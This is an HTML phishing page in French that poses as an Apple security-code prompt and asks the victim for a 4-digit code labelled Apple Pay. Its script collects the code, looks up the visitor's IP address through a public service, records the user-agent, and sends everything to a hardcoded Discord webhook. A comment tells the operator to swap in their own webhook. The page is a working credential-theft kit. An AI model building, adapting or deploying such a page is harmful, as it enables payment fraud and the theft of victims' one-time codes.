<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Code Apple</title>
  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      background-color: #f2f2f7;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background-color: white;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 300px;
      text-align: center;
    }

    .apple-logo {
      width: 30px;
      margin-bottom: 16px;
    }

    h2 {
      font-size: 17px;
      font-weight: 600;
      margin: 0 0 8px;
      color: #111;
    }

    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 24px;
    }

    .otp-inputs {
      display: flex;
      justify-content: space-between;
      gap: 6px;
      margin-bottom: 20px;
    }

    .otp-inputs input {
      width: 44px;
      height: 44px;
      font-size: 22px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #fafafa;
      outline: none;
      transition: border-color 0.3s;
    }

    .otp-inputs input:focus {
      border-color: #007aff;
      background-color: #fff;
    }

    button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      background-color: #007aff;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #005fcc;
    }

    .message {
      margin-top: 14px;
      font-size: 13px;
    }

    .success {
      color: #28a745;
    }

    .error {
      color: #d93025;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
         class="apple-logo" alt="Apple">
    <h2>Code de s√©curit√©</h2>
    <p>Entrez le code √† 4 chiffres</p>

    <form id="otp-form" autocomplete="off">
      <div class="otp-inputs">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      </div>
      <button type="submit">Continuer</button>
      <div id="message" class="message"></div>
    </form>
  </div>

  <script>
    const inputs = document.querySelectorAll(".otp-inputs input");
    const webhookURL = "https://discord.com/api/webhooks/1402398550536622191/VXLfNsLaAOiqQ-XPm6ftacy6DDQ6psjKmdlWJ_wv1wd0nncVg7EgzuFD06dhfGkXcOh4"; // <-- remplace ceci par ta webhook

    // navigation entre inputs
    inputs.forEach((input, i) => {
      input.addEventListener("input", () => {
        if (input.value.length === 1 && i < inputs.length - 1) {
          inputs[i + 1].focus();
        }
      });

      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "" && i > 0) {
          inputs[i - 1].focus();
        }
      });
    });

    document.getElementById("otp-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = Array.from(inputs).map(input => input.value).join('');
      const messageEl = document.getElementById("message");

      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
        messageEl.textContent = "Code invalide.";
        messageEl.className = "message error";
        return;
      }

      // R√©cup√©ration IP
      let ip = "Inconnue";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (err) {
        console.error("Erreur IP");
      }

      const ua = navigator.userAgent;

      const msg =
        `[üçé] APPLE PAY [üçé]\n\n` +
        `üçé Code : ${code}\n\n` +
        `[üåê] TIERS [üåê]\n` +
        `üåê Adresse IP : ${ip}\n` +
        `üåê User-Agent : ${ua}`;

      try {
        const resp = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: msg })
        });

        if (resp.ok) {
          messageEl.textContent = "Code envoy√©.";
          messageEl.className = "message success";
        } else {
          throw new Error("√âchec de l'envoi");
        }
      } catch (err) {
        messageEl.textContent = "Erreur lors de l'envoi.";
        messageEl.className = "message error";
      }
    });
  </script>
</body>
</html>
